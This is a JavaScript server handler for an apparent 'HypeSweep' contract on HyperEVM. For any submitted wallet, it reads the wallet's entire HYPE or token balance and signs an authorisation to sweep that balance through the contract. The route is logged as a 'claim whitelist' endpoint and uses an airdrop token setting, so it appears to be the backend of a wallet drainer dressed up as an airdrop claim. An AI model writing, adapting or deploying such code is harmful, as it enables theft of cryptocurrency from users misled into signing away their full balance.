const { ethers } = require('ethers');
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const HYPEREVM_RPC = process.env.HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm';
const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.HYPESWEEP_CONTRACT || '0xB6973bA89e9d898aD28F922399067c1E9D46f77B';
const HYPE_TOKEN_ADDRESS = process.env.AIRDROP_TOKEN_ADDRESS;

const HYPESWEEP_ABI = [
  'function sweep(uint256 nonce, uint256 deadline, bytes calldata signature) external',
  'function hasSwept(address) view returns (bool)',
  'function nonces(address) view returns (uint256)'
];

const ERC20_ABI = [
  'function balanceOf(address account) view returns (uint256)'
];

async function getHypeBalance(provider, wallet) {
  if (HYPE_TOKEN_ADDRESS && HYPE_TOKEN_ADDRESS !== '0x0000000000000000000000000000000000000000') {
    const tokenContract = new ethers.Contract(HYPE_TOKEN_ADDRESS, ERC20_ABI, provider);
    return await tokenContract.balanceOf(wallet);
  } else {
    return await provider.getBalance(wallet);
  }
}

module.exports = async (req, res) => {
  const { wallet } = req.body;

  if (!wallet || !/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return res.status(400).json({ error: 'Invalid wallet address' });
  }

  try {
    const provider = new ethers.JsonRpcProvider(HYPEREVM_RPC);
    const signer = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);
    const contract = new ethers.Contract(CONTRACT_ADDRESS, HYPESWEEP_ABI, provider);

    const balance = await getHypeBalance(provider, wallet);

    if (balance === 0n) {
      return res.status(400).json({ error: 'No HYPE balance to sweep' });
    }

    const hasSwept = await contract.hasSwept(wallet);
    if (hasSwept) {
      return res.status(400).json({ error: 'Already swept' });
    }

    const contractNonce = await contract.nonces(wallet);
    const deadline = Math.floor(Date.now() / 1000) + 300;

    const messageHash = ethers.keccak256(
      ethers.solidityPacked(
        ['address', 'uint256', 'uint256'],
        [wallet, contractNonce, deadline]
      )
    );

    const signature = await signer.signMessage(ethers.getBytes(messageHash));

    res.json({
      contractAddress: CONTRACT_ADDRESS,
      balance: balance.toString(),
      amount: balance.toString(),
      nonce: contractNonce.toString(),
      deadline,
      signature,
      message: 'Sign to sweep HYPE to trading wallet'
    });
  } catch (error) {
    console.error('Claim whitelist error:', error);
    res.status(500).json({ error: 'Server error' });
  }
};
